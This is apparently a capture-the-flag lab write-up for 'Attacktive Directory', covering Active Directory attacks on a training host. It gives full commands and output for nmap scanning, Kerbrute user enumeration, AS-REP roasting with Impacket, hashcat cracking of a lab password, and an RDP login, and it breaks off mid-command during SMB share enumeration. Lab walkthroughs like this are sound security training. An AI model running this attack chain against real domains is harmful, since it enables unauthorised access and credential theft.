# Attacktive Directory

## Welcome to Attacktive Directory

As usual, we start off with an nmap scan. Our target IP address is 10.10.177.198.

```bash
sudo nmap -v -oA attacktive-directory -Pn -A -T4 -sS \
          -script vuln -p- 10.10.177.198
```

This gives us the following results.

```
# Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Increasing send delay for 10.10.177.198 from 0 to 5 due to 2065 out of 5162 dropped probes since last increase.
Increasing send delay for 10.10.177.198 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
Nmap scan report for 10.10.177.198
Host is up (0.18s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-31 03:31:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49823/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/30%OT=53%CT=1%CU=35966%PV=Y%DS=4%DC=T%G=Y%TM=61CE7D
OS:75%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS
OS:=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NN
OS:S%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y
OS:%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
OS:=Z)

Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   34.37 ms  10.13.0.1
2   ... 3
4   183.65 ms 10.10.177.198

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 20:48:05 2021 -- 1 IP address (1 host up) scanned in 1890.41 seconds
```

We'll use enum4linux to gather some additional information from the Samba shares (139/445) on the target.

```bash
enum4linux 10.10.177.198
```

This produces a lot of noise (I've all of the output to STDERR below) as the target is fairly locked down. But there's a few interesting things here.

```
enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.177.198
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.177.198    |
 ===================================================== 
[E] Can't find workgroup/domain


 ============================================= 
|    Nbtstat Information for 10.10.177.198    |
 ============================================= 
Looking up status of 10.10.177.198
No reply from 10.10.177.198

 ====================================== 
|    Session Check on 10.10.177.198    |
 ====================================== 
[+] Server 10.10.177.198 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.10.177.198    |
 ============================================ 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 ======================================= 
|    OS information on 10.10.177.198    |
 ======================================= 
[+] Got OS info for 10.10.177.198 from smbclient: 
[+] Got OS info for 10.10.177.198 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 10.10.177.198    |
 ============================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================== 
|    Share Enumeration on 10.10.177.198    |
 ========================================== 
do_connect: Connection to 10.10.177.198 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.177.198

 ===================================================== 
|    Password Policy Information for 10.10.177.198    |
 ===================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.177.198 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.177.198)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[E] Failed to get password policy with rpcclient


 =============================== 
|    Groups on 10.10.177.198    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.177.198 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-ADnterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-ADnterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)

 ============================================== 
|    Getting printer info for 10.10.177.198    |
 ============================================== 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Thu Dec 30 21:05:30 2021
```

There's honestly not much here, though we can see that the NETBIOS domain name for the target is THM-AD.

The AD domain itself is using the standard (invalid) .local TLD, but that's not actually something that enum4linux tells us — instead, we can see this in the earlier output from nmap.

* [Using "nmap"](../Notes/Using%20%22nmap%22.md)

## Enumerating Users via Kerberos

We'll now try to enumerate users using Kerbrute and the provided user list.

```bash
kerbrute userenum --dc 10.10.177.198 \
                  --domain spookysec.local \
                  --output attacktive-director.kerbrute \
                           userlist.txt
```

This produces the following output.

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/30/21 - Ronnie Flathers @ropnop

2021/12/30 21:12:56 >  Using KDC(s):
2021/12/30 21:12:56 >   10.10.177.198:88

2021/12/30 21:12:56 >  [+] VALID USERNAME:       james@spookysec.local
2021/12/30 21:12:59 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/12/30 21:13:03 >  [+] VALID USERNAME:       James@spookysec.local
2021/12/30 21:13:05 >  [+] VALID USERNAME:       robin@spookysec.local
2021/12/30 21:13:20 >  [+] VALID USERNAME:       darkstar@spookysec.local
2021/12/30 21:13:30 >  [+] VALID USERNAME:       administrator@spookysec.local
2021/12/30 21:13:49 >  [+] VALID USERNAME:       backup@spookysec.local
2021/12/30 21:13:58 >  [+] VALID USERNAME:       paradox@spookysec.local
2021/12/30 21:14:55 >  [+] VALID USERNAME:       JAMES@spookysec.local
2021/12/30 21:15:14 >  [+] VALID USERNAME:       Robin@spookysec.local
2021/12/30 21:17:10 >  [+] VALID USERNAME:       Administrator@spookysec.local
2021/12/30 21:20:59 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/12/30 21:22:12 >  [+] VALID USERNAME:       Paradox@spookysec.local
2021/12/30 21:26:17 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/12/30 21:27:26 >  [+] VALID USERNAME:       ori@spookysec.local
2021/12/30 21:29:37 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/12/30 21:35:06 >  Done! Tested 73317 usernames (16 valid) in 1330.206 seconds
```

We'll be targeting the `svc-admin` and `backup` accounts. (These are supposed to "jump out" at me, but honestly I'm not sure why they're more interesting than the other users, or `administrator`. Maybe because they're *not* obviously people but also not the `administrator` account?)

* [attacktive-directory-tools / userlist.txt](https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt)
* [Using Kerbrute](../Notes/Using%20Kerbrute.md)

## Abusing Kerberos

We're going to try AS-REP Roasting using Impacket's GetNPUsers.py script. We first create an `attacktive-directory.targets` file containing the following:

```
svc-admin
backup
```

Then, we feed this to the GetNPUsers.py script.

```bash
python3 \
/usr/share/doc/python3-impacket/examples/GetNPUsers.py \
-outputfile attacktive-directory.getnpusers \
-usersfile attacktive-directory.targets \
-dc-ip 10.10.177.198 spookysec.local/
```

GetNPUsers.py reports that `backup` isn't vulnerable to AS-REP roasting, but `svc-admin` *is* vulnerable and we get back a valid hashcat password hash.

A quick lookup in the hashcat example hashes wiki page shows that this is a "Kerberos 5, etype 23, AS-REP" hash (hashcat mode 18200). We'll crack this using the provided password list.

```bash
hashcat -m 18200 \
        -O attacktive-directory.getnpusers \
           passwordlist.txt
```

This reveals that the password for the `svc-admin` account is `management2005`.

Before moving on, we'll connect to the target as `svc-admin` using XFreeRDP to get the first flag.

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore \
         /v:10.10.177.198 /u:svc-admin /p:management2005
```

This flag is in a file called `user.txt` on `svc-admin`'s desktop.

* [Kerberoasting initial: AS-REP Roasting](https://blog.certcube.com/as-rep-roasting-attack/)
* [Kerberos](../Notes/Kerberos.md)
* [Using Impacket](../Notes/Using%20Impacket.md)
* [attacktive-directory-tools / passwordlist.txt](https://github.com/Sq00ky/attacktive-directory-tools/blob/master/passwordlist.txt)
* [Using Hashcat](../Notes/Using%20Hashcat.md)
* [hashcat: Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
* [Using XFreeRDP](../Notes/Using%20XFreeRDP.md)

## Back to the Basics

We're going to drop down and use smbclient to enumerate potential shares on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the `-L` switch).

```bash
smbclient -L THM-AD -I 10.10.177.198 \
